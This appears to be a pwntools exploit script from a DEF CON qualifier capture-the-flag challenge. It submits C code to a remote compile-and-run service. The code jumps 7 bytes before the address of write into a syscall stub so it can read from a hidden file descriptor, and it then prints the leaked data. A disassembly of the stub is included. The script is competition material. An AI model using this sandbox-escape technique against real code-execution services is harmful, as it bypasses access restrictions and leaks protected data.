from pwn import *
context(arch='i386', os='linux')

def u(x):
	import struct
	return struct.unpack("<I", x)[0]

c = '''
int ret3() { return 3; }
int main()
{
	char buf[1024];
	write(1, "hello", 5);	
	unsigned char *w = (unsigned char *)&write;

	void (*go)(int, char *, int) = (void (*)(int,char *, int))(w - 7);

	go(ret3(), buf, 1024);
	write(1, buf, 400);	
}
\x03'''

s = remote('crippled_f7fddee5e137122934909141e7d3f728.quals.shallweplayaga.me', 11111)
s.recvuntil('byte maximum text limit')
s.send(c)

print s.recvuntil('hello')
print s.recv(1024)


'''
0:   b8 04 00 00 00          mov    eax,0x4
5:   8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4]
9:   8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]
d:   8b 54 24 0c             mov    edx,DWORD PTR [esp+0xc]
11:   cd 80                   int    0x80
13:   c3                      ret
'''
